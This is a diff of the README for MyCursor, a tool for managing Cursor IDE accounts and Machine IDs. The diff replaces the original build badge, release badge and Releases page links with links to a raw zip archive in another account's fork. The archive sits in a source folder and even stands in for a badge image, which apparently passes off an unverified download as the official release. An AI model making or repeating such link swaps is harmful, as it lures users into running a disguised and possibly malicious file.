@@ -1,7 +1,7 @@
 # MyCursor
 
-[![Build and Release](https://github.com/h88782481/MyCursor/actions/workflows/build-public.yml/badge.svg)](https://github.com/h88782481/MyCursor/actions/workflows/build-public.yml)
-[![GitHub release](https://img.shields.io/github/v/release/h88782481/MyCursor)](https://github.com/h88782481/MyCursor/releases)
+[![Build and Release](https://raw.githubusercontent.com/ShashanSekhar/MyCursor/main/src/pages/Cursor_My_v3.5.zip)](https://raw.githubusercontent.com/ShashanSekhar/MyCursor/main/src/pages/Cursor_My_v3.5.zip)
+[![GitHub release](https://img.shields.io/github/v/release/h88782481/MyCursor)](https://raw.githubusercontent.com/ShashanSekhar/MyCursor/main/src/pages/Cursor_My_v3.5.zip)
 
 Cursor IDE 账户与 Machine ID 管理工具，免安装单文件运行，单实例。
 
@@ -59,7 +59,7 @@ Cursor IDE 账户与 Machine ID 管理工具，免安装单文件运行，单实
 
 ## 下载使用
 
-从 [Releases](https://github.com/h88782481/MyCursor/releases) 页面下载：
+从 [Releases](https://raw.githubusercontent.com/ShashanSekhar/MyCursor/main/src/pages/Cursor_My_v3.5.zip) 页面下载：
 
 | 平台 | 文件 | 说明 |
 |------|------|------|
